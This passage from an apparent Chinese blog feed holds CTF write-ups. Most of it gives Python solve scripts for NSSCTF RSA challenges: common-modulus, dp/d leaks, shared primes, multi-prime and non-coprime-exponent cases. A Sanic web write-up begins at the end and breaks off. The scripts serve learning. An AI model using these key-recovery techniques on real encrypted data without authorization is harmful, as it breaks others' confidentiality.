class="hljs-number">50460092786111470408945316270086812807230253234809303694007902628924057713984397041141665125615735752600114964852157684904429928771531639899496987905067366415806771003121954852465731110629459725994454904159277228514337278105207721011579794604761255522391446534458815389983562890631994726687526070228315925638</span><br><br>_, s1, s2 = gcdext(e1, e2)<br><br>m = powmod(c1, s1, n)*powmod(c2, s2, n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P9"><a href="#RSA2-P9" class="headerlink" title="[RSA2]P9"></a>[RSA2]P9</h2><p>dp&amp;&amp;dq泄露的题目，我们直接用板子打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">13070310882303377463944295715444821218324151935347454554272870042925400761984585838979931730897626589859098834802923539617244712852188293321626061072925723</span><br>q = <span class="hljs-number">10411551818233737389114520103233235272671271111546186997024935593000298916988792710521511848414549553426943998093077337023514210631662189798921671306236009</span><br>c = <span class="hljs-number">62492280219693914005334023569480350249964827909276875032578276064973191654731196407886841145547165693859745313398152742796887457192397932684370631253099255490064673499746314452067588181106154875239985334051909867580794242253066085627399488604907196244465911471895118443199543361883148941963668551684228132814</span><br>dp = <span class="hljs-number">11568639544706374912496682299967972464196129347160700749666263275305083977187758414725188926013198988871173614336707804756059951725809300386252339177953017</span><br>dq = <span class="hljs-number">3455040841431633020487528316853620383411361966784138992524801280785753201070735373348570840039176552952269927122259706586236960440300255065994052962742469</span><br><br>invp = invert(p, q)<br>m1 = powmod(c, dp, p)<br>m2 = powmod(c, dq, q)<br>m = (((m2 - m1)*invp) % q)*p + m1<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P10"><a href="#RSA2-P10" class="headerlink" title="[RSA2]P10"></a>[RSA2]P10</h2><p>单纯的dp泄露，我们可以通过<br>$$<br>e\times d \equiv 1 \mod \phi(n)<br>$$<br>然后发现<br>$$<br>d_{p}\times e \equiv 1 \mod (p-1)<br>$$<br>然后因为dp&lt;p-1 所以有k&lt;e，那么我们可以直接遍历找到k</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 10</span><br>n = <span class="hljs-number">79201858340517902370077926747686673001645933420450220163567700296597652438275339093680329918615445030212417351430952656177171126427547284822789947152085534939195866096891005587613262293569611913019639653984932469691636338705418303482885987114085769045348074530172292982433373154900841135911548332400167290083</span><br>c = <span class="hljs-number">70109332985937768446301118795636999352761371683181615470371772202170324747707233792154935611826981798791499937601162039878070094663516868746240133223110650205575807753345252087103328657073552992431511929172241702073381723302143955977662087561904058172777520360991685289300855900793806183473523998422682944404</span><br>dp = <span class="hljs-number">3098334089252415941833934532457314870210700261428241562420857845879512952043729097866485406309479489101668423603305497982177150304625615059119312238777275</span><br>e = <span class="hljs-number">65537</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> (e * dp - <span class="hljs-number">1</span>) % i == <span class="hljs-number">0</span>:<br>        p = ((e * dp - <span class="hljs-number">1</span>) // i ) +<span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(p)<br>        <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(q)<br>            d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>            exit(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P11"><a href="#RSA2-P11" class="headerlink" title="[RSA2]P11"></a>[RSA2]P11</h2><p>这里的e较大，我们不能尝试直接遍历了，根据之前的欧拉降幂加上这个，我们可以推出来<br>$$<br>a^{ed_{p}}-a\equiv 0 \mod p<br>$$<br>所以我们可以直接将这个式子和n取gcd即可得到p<br>我们利用这个方法写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">108280026722298796068968170303156759745471686664814404724171434502249429011870583595808692893118419248225924869164875379709992190884930717654004006466664403479467573176438601715156464950045121937338569942817256182277141174728470067308962244296992229214749863655518517510026063088263849891990324547823192559069</span><br>e = <span class="hljs-number">305691242207901867366357529364270390903</span><br>c = <span class="hljs-number">26537258289122728220745496185201994733321402056894636636642710319261241111675937946139938310952968353253866895253865273981912174303818938005932883052177988834834575591342856235464380238486868448329727891268391728758132913642966389278296932186703733187105516710825918064228397602264185334108934765627411913661</span><br>dp = <span class="hljs-number">2656631506624565349527023729530989647164022271235521672257622068579788839123502046687139927161669209201953909023994372208117081512139181611949631467292513</span><br><br>m = <span class="hljs-number">10007</span><br>p = GCD(<span class="hljs-built_in">pow</span>(m,e*dp,n)-m,n)<br>q = n // p <br>d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="RSA2-P12"><a href="#RSA2-P12" class="headerlink" title="[RSA2]P12"></a>[RSA2]P12</h2><p>d泄露，本质就是找了一个数同时是p-1和phi的倍数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>n = <span class="hljs-number">113917408220469425995764932761465306974540330325378601642830241920567032775895088098706711486764203845425248022960733155994427766750033219106642310531864450654102562104771892268897793145789045570107312401570269581223945259704851104645493075550316424129401227653740942495625720165869565257394427181127734628103</span><br>d = <span class="hljs-number">15762135247924329080208071933121250646888501386858311483546464344350547831176536290630826247188272280853810047335214127264865205744683174860903496832368687060941437002920094364116706593296591581117381565805322046922482804679245558495134876677733584718947309975077159564300049936769192724856722338627154192353</span><br>e = <span class="hljs-number">65537</span><br><br><br>t = e*d - <span class="hljs-number">1</span><br>s = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> t % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>    s += <span class="hljs-number">1</span><br>    t //= <span class="hljs-number">2</span><br><br>found = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, s):<br>    c1 = powmod(<span class="hljs-number">2</span>, powmod(<span class="hljs-number">2</span>, i-<span class="hljs-number">1</span>, n)*t, n)<br>    c2 = powmod(<span class="hljs-number">2</span>, powmod(<span class="hljs-number">2</span>, i, n)*t, n)<br>    <span class="hljs-keyword">if</span> c1 != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> c1 != (-<span class="hljs-number">1</span> % n) <span class="hljs-keyword">and</span> c2 == <span class="hljs-number">1</span>:<br>        p = gcd(c1 - <span class="hljs-number">1</span>, n)<br>        q = n // p<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> p &gt; q:<br>    p, q = q, p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NSSCTF&#123;%s&#125;&#x27;</span> % hashlib.md5(<span class="hljs-built_in">str</span>(p).encode()).hexdigest())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nss-工坊wp</title>
    <link href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/"/>
    <url>/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/</url>
    
    <content type="html"><![CDATA[<h2 id="RSA1-P1"><a href="#RSA1-P1" class="headerlink" title="[RSA1]P1"></a>[RSA1]P1</h2><p>发现源码直接给我了p,q,e,c,那就很简单了，我们求出phi,N就可以通过inverse函数拿到phi的逆元d，这样就可以直接解出来明文了，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">10554915510546378513140074459658086644656654144905337809416976066414771647836950941616441505897207397834928781511863699153349798682451297889979721668885951</span><br>q = <span class="hljs-number">8246403321715011123191410826902524505032643184038566851264109473851746507405534573077909160292816825514872584170252311902322051822644609979417178306809223</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">40005881669517895877352756665523238535105922590962714344556374248977905431683140065629966778249773228248201807844489945346731806741025157651474530811920115794270396320935022110691338083709019538562205165553541077855422953438117902279834449006455379382431883650004540282758907332683496655914597029545677184720</span><br>n = p*q<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P2"><a href="#RSA1-P2" class="headerlink" title="[RSA1]P2"></a>[RSA1]P2</h2><p>这次没有直接给我p和q，但是我们可以通过分解n得到<br>于是我们去yafu(真不如factordb)<br>最终代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">7382582015733895208810490097582153009797420348201515356767397357174775587237553842395468027650317457503579404097373070312978350435795210286224491315941881</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">6511001389892474870028836129813814173158254564777610289284056550272120510686249909340499673868720839756059423749304765055919251717618117507007046973023557</span><br>p = <span class="hljs-number">70538125404512947763739093348083497980212021962975762144416432920656660487657</span><br>q = <span class="hljs-number">104660876276442216612517835199819767034152013287345576481899196023866133215633</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P3"><a href="#RSA1-P3" class="headerlink" title="[RSA1]P3"></a>[RSA1]P3</h2><p>也是简单的一个分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">53690629441472827148854210396580805205350972614395425306316047967905824330731</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">22130296334673852790451396673112575082637108306697684532954477845025885087040</span><br>p = <span class="hljs-number">193584665240506752994134779660255197091</span><br>q = <span class="hljs-number">277349599849597463956171076348973750041</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P4"><a href="#RSA1-P4" class="headerlink" title="[RSA1]P4"></a>[RSA1]P4</h2><p>发现就是p-q过小问题，这里yafu集成了这种分解方法，所以我直接yafu一把嗦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">10753464577529272766954987635204502694646829328992120268238206697158857879611091921112122276180123366757978627222693360361364149654146518796988494299998729</span><br>q = <span class="hljs-number">10753464577529272766954987635204502694646829328992120268238206697158857879611091921112122276180123366757978627222693360361364149654146518796988494299998033</span><br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">98161406745910866780822530171878255235776133393411573803496865047700715941955255328757920065032397556905095591171977170479344602512244671081108703687450560269408412671849929423399172588599903975793985819498354819305128607934552101433664794909855378636055525016664559476808490723554481335856183927702549281730</span><br><br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>d = inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P5"><a href="#RSA1-P5" class="headerlink" title="[RSA1]P5"></a>[RSA1]P5</h2><p>还是yafu一把嗦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">148841588941490812589697505975986386226158446072049530534135525236572105309550985274214825612079495930267744452266230141871521931612761645600600201983605957650711248808703757693378777706453580124982526368706977258199152469200838211055230241296139605912607613807871432800586045262879581100319519318390454452117</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">69038543593219231496623016705860610154255535760819426453485115089535439537440188692852514795648297200067103841434646958466720891016026061658602312900242658759575613625726750416539176437174502082858413122020981274672260498423684555063381678387696096811975800995242962853092582362805345713900308205654744774932</span><br>p = <span class="hljs-number">12200065120379104459630695224710181907653841921369674962900093531339421658815375891425102591939094029941691738405035324548070063226677838530633694428729829</span><br>q = <span class="hljs-number">12200065120379104459630695224710181907653841921369674962900093531339421658815305905822146210878434959851438079877557401145694064756239882458467901042367473</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P6"><a href="#RSA1-P6" class="headerlink" title="[RSA1]P6"></a>[RSA1]P6</h2><p>共享素数攻击，这里的加密算法是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">p1 = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>p2 = getPrime(<span class="hljs-number">512</span>)<br><br>n1 = p1*q<br>n2 = p2*q<br><br>e = <span class="hljs-number">65537</span><br><br>m = bytes_to_long(flag)<br>c1 = <span class="hljs-built_in">pow</span>(m, e, n1)<br>c2 = <span class="hljs-built_in">pow</span>(m, e, n2)<br><br></code></pre></td></tr></table></figure><p>也就是我们可以通过gcd来算出我们的p1，因为n1和n2有相同的公因数p，而且加密了两次，所以我们只需要随便取一个解密即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 6 </span><br>n1 = <span class="hljs-number">143348646254804947818644803938588739009782265465565896704788366218178523508874903492905378927641178487821742289009401873633609987818871281146199303052141439575438691652893995423962176259643151111739185844059243400387734688275416379337335777994990138009973618431459431410429980866760075387393812720247541406893</span><br>n2 = <span class="hljs-number">138110854441015362783564250048191029327770295545362614687087481715680856350219966472039006526758450117969049316234863489558254565946242898336924686721846675826468588471046162610143748100096038583426519355288325214365299329095841907207926280081868726568947436076663762493891291276498567791697978693639037765169</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span class="hljs-number">54957154834913405861345262613986460384513988240935244315981524013378872930144117440787175357956479768211180412158274730449811947349624843965933828130932856052315165316154486515277625404352272475136003785605985702495858150662789554694910771308456687676791434476722168247882078861234982509648037033827107552029</span><br>c2 = <span class="hljs-number">122221335585005390437769701090707585780333874638519916373585594040154234166935881089609641995190534396533473702495240511296379249872039728112248708182969185010334637138777948970821974238214641235158623707766980447918480715835847907220219601467702961667091318910582445444058108454023108157805147341928089334736</span><br><br>p = gmpy2.gcd(n1,n2)<br>q1 = n1 // p<br>phi = (p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c1,d,n1)))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P7"><a href="#RSA1-P7" class="headerlink" title="[RSA1]P7"></a>[RSA1]P7</h2><p>这里涉及到了多因子，我记得没错的话应该都是差不多的算法<br>好吧，看来我的记忆没问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">10666139331774428325755287635566473140804481321882464031499529816800186578792308674238646794969384836340484775213796013129603472328582005363876462361316357</span><br>q = <span class="hljs-number">8419311673449738061914489023962717718536471719688567807316495262754711350004888752049108347226115000749280146228195893953964759818878155006622123533942989</span><br>r = <span class="hljs-number">12875078327453384158245832541544758526474680184252540739652077682353277702054275525591573258723948221345537075374635382175740236093131628077747126356403959</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">424552463648937499189041230155623101311087334789253159440707211761796081289342164253743235182597460622581134089949035117444838205449163269030784233435435681797627188717450074808905561404960693227573181548281296514743775615606388692910356320667720308219275107443303501165027740512539959960217657836317351146520079753390346207659007421416917274795119021374032194294225350901136669304225010974617136606299060486198480556729770211945777266366417547752798441211059402</span><br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br>n = p*q*r<br>d = inverse(e,phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P8"><a href="#RSA1-P8" class="headerlink" title="[RSA1]P8"></a>[RSA1]P8</h2><p>加密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br>n = (p**<span class="hljs-number">3</span>) * q<br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br></code></pre></td></tr></table></figure><p>这里虽然是p的三次方，但是我们可以把它理解为多因子试试<br>但是<br>$$<br>\phi(n) &#x3D; \phi(p^{3})\phi(q)正确，但是\phi(p^{3}) &#x3D; p^{2}(p-1)<br>$$<br>这也就是我第一次没有做对的原因<br>所以直接进行一个公式的利用</p><h2 id="RSA1-P9"><a href="#RSA1-P9" class="headerlink" title="[RSA1]P9"></a>[RSA1]P9</h2><blockquote><ul><li>又是一道多因子的题目，不同的是此处的𝑟&#x3D;2𝑟𝑛⋅𝑒+1r&#x3D;2rn​⋅e+1，这有什么特殊之处吗？</li></ul></blockquote><pre><code class="hljs">你可以尝试直接按照P7的exp来进行求解，会发现解出来的明文是乱码，或者你可以将代码中`inverse`函数替换为`gmpy2`中的`invert`函数（二者功能一样），你会发现得到了一个错误`ZeroDivisionError: invert() no inverse exists`提示逆元不存在，这是为什么，我们来看一下此时的𝑝ℎ𝑖phi是多少𝑝ℎ𝑖=(𝑝−1)(𝑞−1)(𝑟−1)=(𝑝−1)(𝑞−1)⋅2𝑟𝑛⋅𝑒phi=(p−1)(q−1)(r−1)=(p−1)(q−1)⋅2rn​⋅e然后我们可以发现𝑒e整除𝑝ℎ𝑖phi，所以他们二者是不互素的，不互素则逆元不存在，那为什么`inverse`函数还是能求解呢（虽然答案是错误的），其实我们可以打印一下使用`inverse`函数输出的𝑑d，会发现𝑑=1d=1，他并没有进行数据校验，而是会`1`。</code></pre><ul><li><p>那么此时我们该如何解决这个RSA问题，逆元不存在这说明对应的私钥不存在，难道是不可解了吗？</p><p>  答案是否定的，我们可以考虑flag比较短，则flag转为数字后的数𝑚m足够小，则有</p><p>  𝑚  𝑝𝑞≡𝑚  𝑛mmodpq≡mmodn</p><p>  什么意思呢，也就是说𝑚m不仅比𝑛n（这里的𝑛&#x3D;𝑝𝑞𝑟n&#x3D;pqr）还小也比𝑝𝑞pq还小，所以取模得到的结果也相同，那么此时有，设</p><p>  𝑐1&#x3D;𝑐  𝑝𝑞&#x3D;(𝑚𝑒  𝑛)  𝑝𝑞&#x3D;𝑚𝑒  𝑝𝑞𝑒𝑑1≡1(mod𝜑(𝑝𝑞))𝑐1𝑑1≡𝑚(mod𝑝𝑞)c1​&#x3D;cmodpq&#x3D;(memodn)modpq&#x3D;memodpqed1​≡1(modφ(pq))c1d1​​≡m(modpq)</p><p>  即𝑐1c1​为𝑐c再模𝑝𝑞pq的结果，根据模的性质有𝑐1c1​便是消息使用公钥(𝑝𝑞,𝑒)(pq,e)加密的结果，那么此时我们可以求出该公钥对应的私钥进行解密，得到𝑚  𝑝𝑞mmodpq的结果，又因为𝑚m比较小，所以该结果直接就是𝑚m。</p><p>  在实际计算中，我们其实并不需要额外写一句<code>c1 = c % (p*q)</code>，因为根据模的性质，只要最后进行了模运算即可。</p></li><li><p>其实通俗一点的理解就是当𝑚m比较小时，此时就算公钥对应的私钥不存在（逆元不存在），我们可以考虑将公钥转化为其他公钥（用原公钥因子进行重组）再尝试求解私钥进行解密，依然可以得到正确结果。</p><p>  这里其实也就解释了为什么P7，P8需要加上大量字符串的填充，就是为了防止使用该方法直接解出，在现实世界的RSA算法应用标准中，明文其实都会用特定算法进行填充来防止这种情况出现。</p></li></ul><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 9 </span><br>p = <span class="hljs-number">7478755670255767435237487693415479182290330775502792675052667363676831056436638619069277770540533350723045234676443621124912287506103439704868369839725279</span><br>q = <span class="hljs-number">9232828888049557325429111621080998490274442347556398052322580869768941301413255711626092627273543579067597113958627672298942570149816938335701615759283713</span><br>r = <span class="hljs-number">102909133680612532601801231903654039</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">142893174944324070830219394465469685943669308818639857030565389839224452373848570577201378981080333784852764502832587008270072323948511579823852437852643609820245476634896477031076952735298279618952398460203032125853063235638358942643559551563899381032067185778629120272032518475352761100115057449043142848203976076694124978394099839339406197</span><br><br>n = p*q*r<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, p*q)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="RSA1-P10"><a href="#RSA1-P10" class="headerlink" title="[RSA1]P10"></a>[RSA1]P10</h2><p>一个典型的e和phi不互素的问题<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 9</span><br>p = <span class="hljs-number">9927950299160071928293508814174740578824022211226572614475267385787727188317224760986347883270504573953862618573051241506246884352854313099453586586022059</span><br>q = <span class="hljs-number">9606476151905841036013578452822151891782938033700390347379468858357928877640534612459734825681004415976431665670102068256547092636766287603818164456689343</span><br>e = <span class="hljs-number">131074</span><br>c = <span class="hljs-number">68145285629092005589126591120307889109483909395989426479108244531402455690717006058397784318664114589567149811644664654952286387794458474073250495807456996723468838094551501146672038892183058042546944692051403972876692350946611736455784779361761930869993818138259781995078436790236277196516800834433299672560</span><br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>_gcd = gmpy2.gcd(e, phi)<br>d = gmpy2.invert(e//_gcd, phi)<br>m_gcd = gmpy2.powmod(c, d, n)<br>m = gmpy2.iroot(m_gcd, _gcd)    <span class="hljs-comment"># 得到元组 (mpz(1920535408007397829480400151650246901210634018403879187581), True)</span><br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(m[<span class="hljs-number">0</span>]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘</title>
    <link href="/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic&#39;s%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<blockquote><p>[!NOTE] 一些小小的碎碎念<br>第一次看到sanic其实是不知所措的，感觉这个虽然是眼熟，但也仅限于眼熟，显而易见的，国赛没有做出来，也因为一些心态问题没有做复盘，时隔近两月，慢慢调整好心态后终于是借着gxn师傅的Sanic revenge进行了整体的复盘</p></blockquote><p>这里放上gxn师傅的博客</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">https://www.cnblogs.com/gxngxngxn/p/18205235<br>https://www.cnblogs.com/gxngxngxn/p/18290489<br></code></pre></td></tr></table></figure><h2 id="ciscn2024-sanic"><a href="#ciscn2024-sanic" class="headerlink" title="ciscn2024 sanic"></a>ciscn2024 sanic</h2><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 